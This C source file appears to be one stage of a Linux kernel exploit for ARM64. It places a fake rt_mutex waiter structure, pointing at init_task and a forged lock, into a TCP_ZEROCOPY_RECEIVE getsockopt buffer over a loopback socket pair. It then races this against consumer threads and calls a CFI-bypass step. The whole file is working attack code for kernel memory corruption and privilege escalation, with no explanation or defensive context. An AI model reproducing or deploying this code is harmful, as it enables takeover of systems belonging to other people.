#include "common.h"
#include <netinet/in.h>
#include <netinet/tcp.h>

#ifndef TCP_ZEROCOPY_RECEIVE
#define TCP_ZEROCOPY_RECEIVE 35
#endif
#ifndef TCP_ZC_ATTEMPTS
#define TCP_ZC_ATTEMPTS 256
#endif
#ifndef TCP_ZC_SPIN_ITERS
#define TCP_ZC_SPIN_ITERS 4000
#endif

struct tcp_zc_recv {
  uint64_t address;
  uint32_t length;
  uint32_t recv_skip_hint;
  uint32_t inq;
  int32_t err;
  uint64_t copybuf_address;
  int32_t copybuf_len;
  uint32_t flags;
  uint64_t msg_control;
  uint64_t msg_controllen;
  uint32_t msg_flags;
  uint32_t reserved;
};

static void build_zc_waiter(struct tcp_zc_recv *zc) {
  memset(zc, 0, sizeof(*zc));
  unsigned char *p = (unsigned char *)zc;

#if LEGACY_RT_MUTEX_WAITER
  put64(p, 0x00, fake_w0);
  put64(p, 0x08, 0);
  put64(p, 0x10, 0);
  put64(p, 0x18, 0);
  put64(p, 0x20, 0);
  put64(p, 0x28, 0);
  put64(p, 0x30, text_addr(INIT_TASK));
  put64(p, 0x38, fake_lock);
#elif COMPACT_RT_MUTEX_WAITER
  put64(p, 0x00, fake_w0);
  put64(p, 0x08, 0);
  put64(p, 0x10, 0);
  if (FAKE_WAITER_TASK_OFF < 0x40)
    put64(p, FAKE_WAITER_TASK_OFF, text_addr(INIT_TASK));
  if (FAKE_WAITER_LOCK_OFF < 0x40)
    put64(p, FAKE_WAITER_LOCK_OFF, fake_lock);
  if (FAKE_WAITER_PRIO_OFF < 0x3c)
    put32(p, FAKE_WAITER_PRIO_OFF, SLIDE_FAKE_WAITER_PRIO);
#else
  put64(p, 0x00, fake_w0);
  put64(p, 0x08, 0);
  put64(p, 0x10, 0);
  if (FAKE_WAITER_TASK_OFF < 0x40)
    put64(p, FAKE_WAITER_TASK_OFF, text_addr(INIT_TASK));
  if (FAKE_WAITER_LOCK_OFF < 0x40)
    put64(p, FAKE_WAITER_LOCK_OFF, fake_lock);
#endif
}

static int create_tcp_pair(int fds[2]) {
  int lsock = socket(AF_INET, SOCK_STREAM | SOCK_CLOEXEC, 0);
  if (lsock < 0)
    return -1;

  struct sockaddr_in addr;
  memset(&addr, 0, sizeof(addr));
  addr.sin_family = AF_INET;
  addr.sin_addr.s_addr = htonl(INADDR_LOOPBACK);
  addr.sin_port = 0;

  if (bind(lsock, (struct sockaddr *)&addr, sizeof(addr)) < 0 ||
      listen(lsock, 1) < 0) {
    close(lsock);
    return -1;
  }

  socklen_t alen = sizeof(addr);
  if (getsockname(lsock, (struct sockaddr *)&addr, &alen) < 0) {
    close(lsock);
    return -1;
  }

  int csock = socket(AF_INET, SOCK_STREAM | SOCK_CLOEXEC, 0);
  if (csock < 0) {
    close(lsock);
    return -1;
  }

  if (connect(csock, (struct sockaddr *)&addr, sizeof(addr)) < 0) {
    close(csock);
    close(lsock);
    return -1;
  }

  int asock = accept(lsock, NULL, NULL);
  close(lsock);
  if (asock < 0) {
    close(csock);
    return -1;
  }

  fds[0] = csock;
  fds[1] = asock;
  return 0;
}

void do_tcp_zc_fake_lock_route(void) {
  if (!page_base || !fake_lock || !fake_fops) {
    cfi_last_step = 30;
    cfi_last_errno = 0;
    pr_error("tcp_zc route missing kernel page base=%016zx lock=%016zx "
             "fops=%016zx\n",
             page_base, fake_lock, fake_fops);
    return;
  }

  int tcp_fds[2];
  if (create_tcp_pair(tcp_fds) < 0) {
    cfi_last_step = 31;
    cfi_last_errno = errno;
    pr_error("tcp_zc route socket pair failed errno=%d\n", errno);
    return;
  }

  struct tcp_zc_recv zc;
  build_zc_waiter(&zc);

  int route_verified = 0;
  int calls = 0;
  int success = 0;

  atomic_store(&consumer_calls, 0);
  atomic_store(&consumer_success, 0);
  atomic_store(&punch_consume_stop, 0);
  atomic_store(&punch_consume_go, 1);

  for (int attempt = 1; attempt <= TCP_ZC_ATTEMPTS; attempt++) {
    socklen_t optlen = sizeof(zc);
    getsockopt(tcp_fds[0], SOL_TCP, TCP_ZEROCOPY_RECEIVE, &zc, &optlen);

    build_zc_waiter(&zc);

    for (int spin = 0; spin < TCP_ZC_SPIN_ITERS; spin++) {
      __asm__ volatile("yield" ::: "memory");
    }

    calls = atomic_load(&consumer_calls);
    success = atomic_load(&consumer_success);

    if (calls > 0 && success > 0) {
      atomic_store(&punch_consume_go, 0);
      if (try_cfi_stage()) {
        cfi_last_step = 0;
        route_verified = 1;
      } else if (!cfi_last_step) {
        cfi_last_step = 32;
      }
      break;
    }

    if (cfi_dirty_seen) {
      break;
    }
  }

  atomic_store(&punch_consume_go, 0);
  close(tcp_fds[0]);
  close(tcp_fds[1]);
  pr_info("tcp_zc route done=%d calls=%d success=%d step=%d errno=%d\n",
          route_verified, calls, success, cfi_last_step, cfi_last_errno);
}
